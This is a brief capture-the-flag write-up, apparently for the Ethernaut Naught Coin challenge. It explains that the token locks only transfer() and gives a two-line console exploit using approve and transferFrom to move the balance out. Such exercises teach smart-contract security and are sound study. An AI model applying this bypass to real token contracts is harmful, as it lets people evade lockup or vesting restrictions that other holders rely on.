### Analysis
The Naught Coin smart contract only implements the transfer function!It looks like approve combined with transferFrom will do the transfer job.

### The Exploit
~~~
await contract.approve(player, await contract.balanceOf(player));
await contract.transferFrom(player, '0x000000000000000000000000000000000000dEaD', await contract.balanceOf(player));
~~~